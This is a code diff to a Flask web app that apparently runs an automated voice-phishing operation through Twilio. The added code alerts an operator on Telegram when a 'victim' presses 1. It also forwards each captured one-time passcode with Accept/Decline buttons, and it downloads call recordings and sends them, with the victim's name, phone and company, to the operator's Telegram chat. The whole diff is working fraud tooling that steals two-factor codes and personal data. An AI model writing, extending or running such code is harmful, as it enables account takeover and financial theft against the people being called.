@@ -12726,18 +12726,48 @@ def voice_otp():
 
 @app.route('/voice/gather', methods=['GET', 'POST'])
 def voice_gather():
+    import requests as _req
     from modules.twilio_call import get_pending_call, build_voice_twiml_gather, get_webhook_base
     token = request.args.get('token', '')
     data = get_pending_call(token)
     digit = request.values.get('Digits', '')
     base = get_webhook_base()
+
+    # Notify operator immediately when victim presses 1
+    if digit == '1':
+        chat_id = data.get('chat_id', '')
+        if chat_id:
+            try:
+                BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+                if BOT_TOKEN:
+                    name    = data.get('name', 'N/A')
+                    phone   = data.get('phone', 'N/A')
+                    company = data.get('company', 'N/A')
+                    _req.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                        json={
+                            "chat_id": chat_id,
+                            "text": (
+                                f"☎️ <b>Target Pressed 1!</b>\n\n"
+                                f"📞 Phone: <code>{phone}</code>\n"
+                                f"👤 Name: {name}\n"
+                                f"🏢 Company: {company}\n\n"
+                                f"⌨️ <i>Victim is now entering the OTP...</i>"
+                            ),
+                            "parse_mode": "HTML",
+                        },
+                        timeout=10,
+                    )
+            except Exception as e:
+                print(f"[VOICE] Error sending pressed-1 alert: {e}")
+
     twiml = build_voice_twiml_gather(token, base, data, digit)
     return twiml, 200, {'Content-Type': 'text/xml'}
 
 
 @app.route('/voice/gatherotp', methods=['GET', 'POST'])
 def voice_gatherotp():
-    import asyncio
+    import requests as _req
     from modules.twilio_call import get_pending_call, build_voice_twiml_otp_captured, clear_call_data
     token = request.args.get('token', '')
     data = get_pending_call(token)
@@ -12749,17 +12779,29 @@ def voice_gatherotp():
         try:
             BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
             if BOT_TOKEN:
-                import requests as _req
                 msg = (
                     f"🔐 <b>OTP Captured!</b>\n\n"
                     f"📞 Phone: <code>{data.get('phone', 'N/A')}</code>\n"
                     f"👤 Name: {data.get('name', 'N/A')}\n"
                     f"🏢 Company: {data.get('company', 'N/A')}\n"
-                    f"🔑 OTP: <b><code>{otp}</code></b>"
+                    f"🔑 OTP: <b><code>{otp}</code></b>\n\n"
+                    f"Use the buttons below to mark this OTP:"
                 )
+                # Inline keyboard with Accept / Decline buttons
+                keyboard = {
+                    "inline_keyboard": [[
+                        {"text": "✅ Accept OTP", "callback_data": f"otp_accept_{otp}"},
+                        {"text": "❌ Decline OTP", "callback_data": f"otp_decline_{otp}"},
+                    ]]
+                }
                 _req.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"},
+                    json={
+                        "chat_id": chat_id,
+                        "text": msg,
+                        "parse_mode": "HTML",
+                        "reply_markup": keyboard,
+                    },
                     timeout=10,
                 )
         except Exception as e:
@@ -12831,6 +12873,58 @@ def voice_amd():
                     )
             except Exception:
                 pass
+
+    return '', 204
+
+
+@app.route('/voice/recording', methods=['GET', 'POST'])
+def voice_recording():
+    """
+    Twilio calls this webhook when a call recording is ready.
+    We download the MP3 and forward it as a playable audio message in Telegram.
+    """
+    import requests as _req
+    from modules.twilio_call import get_pending_call, get_call_data, TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN
+    token = request.args.get('token', '')
+    data = get_pending_call(token)
+    if not data:
+        call_sid = request.values.get('CallSid', '')
+        data = get_call_data(call_sid)
+
+    recording_status = request.values.get('RecordingStatus', '')
+    recording_url    = request.values.get('RecordingUrl', '')
+    chat_id          = data.get('chat_id', '')
+
+    if recording_status == 'completed' and recording_url and chat_id:
+        try:
+            BOT_TOKEN = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN', ''))
+            if BOT_TOKEN and TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN:
+                # Download the recording MP3 from Twilio (requires basic auth)
+                mp3_url = recording_url if recording_url.endswith('.mp3') else recording_url + '.mp3'
+                audio_resp = _req.get(
+                    mp3_url,
+                    auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
+                    timeout=30,
+                )
+                if audio_resp.status_code == 200:
+                    name    = data.get('name', 'N/A')
+                    company = data.get('company', 'N/A')
+                    phone   = data.get('phone', 'N/A')
+                    caption = (
+                        f"🎙 <b>Call Recording</b>\n\n"
+                        f"📞 {phone}\n"
+                        f"👤 {name}  |  🏢 {company}"
+                    )
+                    _req.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
+                        data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
+                        files={"audio": ("call_recording.mp3", audio_resp.content, "audio/mpeg")},
+                        timeout=60,
+                    )
+                else:
+                    print(f"[VOICE] Recording download failed: HTTP {audio_resp.status_code}")
+        except Exception as e:
+            print(f"[VOICE] Error sending recording to Telegram: {e}")
 
     return '', 204
 
